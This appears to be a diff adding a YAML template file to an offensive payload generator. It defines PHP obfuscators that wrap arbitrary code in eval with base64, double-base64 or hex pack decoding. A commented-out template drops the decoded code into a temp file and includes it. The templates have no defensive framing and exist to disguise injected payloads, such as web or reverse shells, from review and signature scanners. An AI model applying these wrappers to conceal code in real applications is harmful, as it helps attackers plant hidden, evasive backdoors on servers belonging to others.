@@ -1,0 +1,120 @@
+---
+
+###
+### Meta definitions
+###
+specification:
+  payload: code
+  type: obfuscator
+  version: 0.0.1
+
+
+###
+### Items
+###
+items:
+
+  # --------------------------------------------------------------------------------
+  # php-eval-base64
+  # --------------------------------------------------------------------------------
+  - name: php-eval-base64
+    desc: desc
+    info: []
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7, 8]
+        commands: []
+        functions: ["eval", "base64_decode"]
+        modules: []
+        os: ["bsd", "linux", "mac", "solaris", "windows"]
+    payload: |
+      eval(base64_decode("<FUN:0:base64pad>__CODE__</FUN:0:base64pad>"));
+
+  - name: php-eval-base64-noquote
+    desc: desc
+    info:
+      - Does not work on PHP 8.0 anymore
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7]
+        commands: []
+        functions: ["eval", "base64_decode"]
+        modules: []
+        os: ["bsd", "linux", "mac", "solaris", "windows"]
+    payload: |
+      eval(base64_decode(<FUN:0:base64pad>__CODE__</FUN:0:base64pad>));
+
+
+  # --------------------------------------------------------------------------------
+  # php-eval-base64-base64
+  # --------------------------------------------------------------------------------
+  - name: php-eval-base64-base64
+    desc: desc
+    info: []
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7, 8]
+        commands: []
+        functions: ["eval", "base64_decode"]
+        modules: []
+        os: ["bsd", "linux", "mac", "solaris", "windows"]
+    payload: |
+      eval(base64_decode(base64_decode("<FUN:0:2xbase64pad>__CODE__</FUN:0:2xbase64pad>")));
+
+  - name: php-eval-base64-base64-noquote
+    desc: desc
+    info:
+      - Does not work on PHP 8.0 anymore
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7]
+        commands: []
+        functions: ["eval", "base64_decode"]
+        modules: []
+        os: ["bsd", "linux", "mac", "solaris", "windows"]
+    payload: |
+      eval(base64_decode(base64_decode(<FUN:0:2xbase64pad>__CODE__</FUN:0:2xbase64pad>)));
+
+
+  # --------------------------------------------------------------------------------
+  # php-eval-hex
+  # --------------------------------------------------------------------------------
+  - name: php-eval-pack-hex
+    desc: desc
+    info: []
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7, 8]
+        commands: []
+        functions: ["eval", "pack"]
+        modules: []
+        os: ["bsd", "linux", "mac", "solaris", "windows"]
+    payload: |
+      eval(pack("H<FUN:1:len><FUN:0:hexplain>__CODE__</FUN:0:hexplain></FUN:1:len>","<FUN:0:hexplain>__CODE__</FUN:0:hexplain>"));
+
+
+  # --------------------------------------------------------------------------------
+  # php-base64-include
+  # --------------------------------------------------------------------------------
+  # TODO: This seems to be hang up connection as soon as it connected initially.
+  # - name: php-base64-include
+  #   desc: desc
+  #   info: []
+  #   code:
+  #     language: php
+  #     requires:
+  #       version: [5, 6, 7, 8]
+  #       commands: []
+  #       functions: ["empnam", "base64_decode", "fopen", "fwrite", "include", "sys_get_temp_dir"]
+  #       modules: []
+  #       os: ["bsd", "linux", "mac", "solaris", "windows"]
+  #   payload: |
+  #     $f=tempnam(sys_get_temp_dir(),"e");
+  #     $h=fopen($f,base64_decode("<FUN:0:base64pad>w+</FUN:0:base64pad>"));
+  #     fwrite($h,base64_decode("<FUN:0:base64pad><?php __CODE__</FUN:0:base64pad>"));
+  #     include($f);
